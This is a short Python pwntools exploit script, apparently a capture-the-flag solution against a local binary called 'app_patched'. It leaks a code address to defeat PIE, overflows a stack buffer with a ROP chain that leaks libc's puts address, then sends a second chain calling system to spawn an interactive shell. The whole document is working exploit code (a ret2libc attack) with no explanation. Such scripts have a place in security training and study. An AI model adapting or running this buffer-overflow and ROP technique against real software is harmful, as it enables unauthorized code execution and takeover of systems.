from pwn import *

exe = ELF("./app_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'

p = process([exe.path])

p.recvline()
p.sendline(b"admin"+b"a"*98)
p.recvline()
leak = u64(p.recvline().strip()[:-1].ljust(8, b"\x00"))
log.info(f"Leaked admin_fun -  {hex(leak)}")
p.recvlines(2)

pie_base = leak - 0x11a9
puts_plt = pie_base + 0x1090
printf_got = pie_base + 0x4028
puts_got = pie_base + 0x4020
main = pie_base + 0x121f
pop_rdi = pie_base + 0x1323
ret = pie_base+0x101a
log.info(f"printf_got - {hex(printf_got)}")

p.sendline(b"a"*120+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main))
p.recvuntil("bye!\n")
libc_puts = u64(p.recvline()[:-1].ljust(8, b"\x00"))
libc.address = libc_puts - libc.symbols["puts"]

log.info(f"Leaked libc puts -  {hex(libc_puts)}")
log.info(f"Leaked libc -  {hex(libc.address)}")
log.info(f"Leaked libc printf-  {hex(libc.symbols["printf"])}")

p.sendline(b"a"*120+p64(pop_rdi)+p64(libc.address+0x1b45bd)+p64(ret)+p64(libc.symbols["system"]))
p.interactive()